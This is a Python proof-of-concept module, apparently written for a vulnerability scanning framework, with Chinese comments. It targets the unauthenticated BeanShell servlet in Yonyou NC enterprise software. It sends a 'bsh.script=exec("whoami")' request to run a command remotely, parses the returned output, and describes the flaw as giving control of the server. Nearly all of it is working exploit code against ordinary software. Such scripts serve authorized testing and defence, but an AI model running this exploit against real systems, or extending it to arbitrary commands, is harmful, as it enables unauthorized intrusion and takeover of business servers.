
# 导入需要的模块
from lib.request.requests_new import Requests
import re


# 下面为主函数，不要修改函数名
def payload(target):
	
	# 返回测试结果，请勿删除，用来传递POC结果，如命令执行结果，弱口令的账号密码等
	POC_RETURN = ""

	uri = "/servlet/~ic/bsh.servlet.BshServlet" # 注意uri首字符必须带“/”
	url = target+uri
	headers = {
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
	'Content-Type': 'application/x-www-form-urlencoded'
	}

	data = 'bsh.script=exec("whoami");'

	response = Requests().post(url, headers=headers, data=data).text

	try:
		POC_RETURN = re.findall(r'<pre>(.*?)</pre>', response, re.DOTALL)[0].replace("\\", "\\\\")
	except:
		POC_RETURN = ""

	# 判断是否执行成功，成功返回True，否则返回False
	if "Script Output" in response:
		return True, POC_RETURN
	else:
		return False, POC_RETURN


# 添加POC详情，方便使用者更容易地复现，比如POC介绍、复现的参考链接
def poc_description():
	
	# 介绍（漏洞原理、修复建议等）
	introduce = """该漏洞为远程命令执行漏洞，由于用友NC对外开放了BeanShell接口，攻击者可以在无需经过身份验证的情况下直接访问该接口，并构造恶意数据执行任意命令，攻击成功可获得目标服务器权限。"""

	# 参考链接
	reference_link = ["https://www.freebuf.com/vuls/281039.html"]

	return introduce, reference_link

